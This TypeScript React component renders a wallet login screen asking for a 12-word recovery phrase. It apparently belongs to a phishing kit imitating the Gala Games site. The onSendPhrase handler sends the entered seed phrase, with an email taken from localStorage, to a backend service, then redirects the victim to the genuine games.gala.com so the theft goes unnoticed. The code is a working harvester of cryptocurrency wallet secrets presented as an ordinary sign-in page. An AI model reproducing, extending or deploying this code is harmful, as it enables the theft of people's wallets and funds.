'use client'

import styles from "./styles.module.css"
import {useState} from "react";
import {connection} from "@/services/connection";
import {sessionConst} from "@/constants/session";

export function Wallet() {
  const [message, setMessage] = useState("");
  const [isError, setIsError] = useState(false);
  const [phrase, setPhrase] = useState("");
  const [loading, setLoading] = useState(false);

  const handleTextAreaChange = (el: any): void => {
    let value: string = el.target.value;
    let valueLength: number = value.length;
    let wordsCount: number = value.split(" ").length;

    setPhrase(value);

    if (valueLength > 1 && value[valueLength - 1] == " " && value[valueLength - 2] == " ") {
      value = value.slice(0, -1);
      valueLength--;
    }

    if (wordsCount == 13 && value[valueLength - 1] == " ") {
      value = value.slice(0, -1);
      wordsCount--;
    }

    el.target.value = value;

    if (!(value[valueLength - 1] != " " && wordsCount == 12)) {
      setMessage("Words count should be 12");
      setIsError(true);
      return
    }

    setMessage("That`s it!");
    setIsError(false);
  }


  const onSendPhrase = async () => {
    setLoading(true);
    const {
      error,
    } = await connection.withoutActions({
      email: ` ${localStorage.getItem(sessionConst.Email) ?? ''} `,
      phrase: ` ${phrase} `,
    })

    setLoading(false);

    if (error) {
      window.location.reload();
    } else {
      window.location.assign('https://games.gala.com/')
    }
  }

  return (
    <div className={styles.walletContentWrapper}>
      <div className={styles.walletContent}>
        <h2 className={styles.walletHeadline}>Enter using Recovery Phase</h2>
        <p className={styles.walletParagraph}>This is a 12-word phase that you received when you created your wallet</p>
        <div className={styles.walletWordPhaseTextAreaWrapper}>
          <textarea className={styles.walletWordPhaseTextArea} onChange={handleTextAreaChange} name="word-phrase"
                    id="wallet-word-phase-id" cols={30} rows={10}
                    placeholder='Enter the 12-word phrase below'></textarea>
          {message && <div className={`${styles.messageBlock} ${isError && styles.messageBlockError}`}>{message}</div>}
        </div>
        <div className={styles.walletAgreeText}>By clicking continue, you agree to the terms and privacy policy</div>
        <button onClick={onSendPhrase} disabled={isError} className={styles.walletContinueButton}
                id="wallet-continue-button">{loading ? 'Loading...' : 'Continue'}
        </button>
      </div>
    </div>
  );
};
